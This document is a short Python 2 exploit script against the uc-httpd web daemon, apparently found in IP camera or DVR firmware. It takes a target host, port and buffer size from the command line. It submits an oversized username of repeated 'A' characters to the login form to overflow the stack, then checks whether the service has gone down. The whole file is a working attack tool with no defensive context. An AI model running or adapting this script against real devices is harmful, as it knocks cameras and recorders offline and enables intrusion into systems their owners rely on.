import mechanize, time, sys, urllib, socket

from termcolor import colored

print colored('uc-httpd web-daemon bufferoverflow', 'red')
print colored('- Overwrites the stack (attach to see)', 'red')
print colored('- Kernel watchdog module restarts Sofia after 2 minutes', 'red')
time.sleep(2)

def at_login_overflow():
    print colored('Sending payload.. ', 'red')
    s_c = "\x2f\x4c\x6f\x67\x69\x6e\x2e\x68\x74\x6d" # Page id
    x = mechanize.Browser()
    x.set_handle_robots(False)
    x.set_debug_responses(True)
    x.addheaders = [("User-agent",
                     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]

    login = x.open(tar_full + s_c)
    x.select_form(nr=0)

    x["username"] = buffersm
    x["password"] = "mikevirushackinglimited"

    try:
        x.submit()
    except Exception:
	    print colored('Target daemon not vulnerable.', 'red')
        pass

    check_conn()


# Check interface status
def check_conn():
    time.sleep(1)
    print colored('Checking interface status..', 'red')

    try:
        urllib.urlopen(tar_full)
        print colored('Exploit failed', 'red')
    except Exception:
        print colored('Finished.', 'red')
        pass

tar = sys.argv[1]
tar_p = sys.argv[2]
buff_size = sys.argv[3]

tar_full = "http://" + tar + ":" + tar_p

# rec 180
buffersm = "\x41" * int(buff_size)

# post only
at_login_overflow()